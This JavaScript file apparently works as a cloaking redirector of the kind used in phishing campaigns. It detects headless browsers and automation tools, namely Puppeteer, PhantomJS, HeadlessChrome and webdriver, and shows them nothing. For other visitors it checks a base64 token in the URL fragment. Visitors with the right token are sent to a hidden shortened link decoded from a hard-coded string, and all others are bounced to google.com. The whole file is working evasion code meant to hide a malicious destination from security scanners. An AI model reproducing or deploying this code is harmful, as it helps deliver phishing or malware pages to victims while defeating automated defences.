const isProbablyHeadless = () => {
    const ua = navigator.userAgent || "";
    const isHeadlessUA = /HeadlessChrome|puppeteer|phantomjs/i.test(ua);
    const isWebdriver = navigator.webdriver;
    const hasNoPlugins = navigator.plugins?.length === 0;
  
    const isMobile = /Mobi|Android|iPhone|iPad/i.test(ua);
    const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
  
    const isLikelyRealUser = isMobile || isSafari;
    return !isLikelyRealUser && (isHeadlessUA || isWebdriver || hasNoPlugins);
  };
  async function rdr() {
    const isHeadless = isProbablyHeadless();
    if (isHeadless) {
      console.log("headles");
      return;
    } else {
      if (window.location.href.split("#")[1] != undefined) {
        function decodeData() {
          const a = window.location.href.split("#")[1];
          const encodedInput = a.split("=")[1];
  
          if (!encodedInput) {
            window.location.href = "https://href.li?https://google.com";
            return;
          }
          if (!encodedInput.startsWith("r-")) {
            window.location.href = "https://href.li?https://google.com";
            return;
          }
          const base64String = encodedInput
            .slice(2)
            .replace(/-/g, "+")
            .replace(/_/g, "/");
          try {
            const jsonData = atob(base64String);
            const decodedObject = JSON.parse(jsonData);
            const urlEncodedInput =
              "r-eyJkYXRhIjoiMmx5LmxpbmsvMjZJaGk_dXNlcj1hdXRob3JpemVkIn0";
            if (decodedObject.data == "authorizedUser") {
              const urlbase64String = urlEncodedInput
                .slice(2)
                .replace(/-/g, "+")
                .replace(/_/g, "/");
              const urljsonData = atob(urlbase64String);
              const urldecodedObject = JSON.stringify(urljsonData);
              const decodedObject = JSON.parse(urldecodedObject);
              const linkString = decodedObject;
              const jsonObject = JSON.parse(linkString);
              const link = jsonObject.data;
              document.location.href = `https://${link}`;
  
              return;
            } else {
                window.location.href = "https://href.li?https://google.com";
              return;
            }
          } catch (error) {
            return;
          }
        }
        decodeData();
      } else {
        window.location.href = "https://href.li?https://google.com";
      }
    }
  }
  rdr();
